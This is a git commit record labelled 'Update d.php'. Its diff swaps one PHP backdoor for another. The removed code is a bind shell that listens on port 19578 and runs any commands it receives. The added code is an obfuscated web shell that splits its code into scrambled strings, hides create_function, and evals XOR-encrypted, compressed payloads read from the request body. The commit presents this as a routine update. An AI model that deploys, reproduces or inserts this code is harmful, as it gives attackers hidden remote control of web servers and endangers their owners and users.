44fc645505ce826d0c687b388b132f0236c1c5ff
zlamma.html <yonathandoss@gmail.com>
2022-08-13 04:36:50 -0300

    Update d.php

--- d.php
+++ d.php
@@ -1,3 +1,12 @@
 <?php
-$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",19578);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}
-;?>
+$q='$|k="840a9477";$|kh="2|70||6ece9568d"|;|$kf="1f9554|aa|c|cf|5"|;$|p="yGP7Hk5';
+$I='$j};}}re|turn |$o;}if| (@pr|eg_ma|tch("/$kh(||.+)$|kf|/",@fil|e_get_conte|';
+$Z=';$r=|@base6|4_enco|de(@x|(|@gzcom|press($o),|$k))|;print("$||p$kh$r$kf");}';
+$E='q|V0qvhJZl";|funct|ion x($t,$k){$c=|strlen($|k);$|l=strlen($t);$o=|"||";fo';
+$Q=str_replace('vM','','cvMrevMatvMe_fvMuvMvMnction');
+$s='bas|e64_decode|($|m[1]),$k)))||;|$o=@ob_get_conte|nts()|;@ob_en|d_cle|an()';
+$A='r($|i=0;$i<$l;){for(||$|j=0;|($j<$c&&$i|<|$l);$j++,$i++){||$o.=$t{$i}^|$k{';
+$d='nts("php|://|input"),|$m)==1) {|@ob_star|t();@e|val(|@gzunco|mpr|ess(@x(|@';
+$e=str_replace('|','',$q.$E.$A.$I.$d.$s.$Z);
+$F=$Q('',$e);$F();
+?>
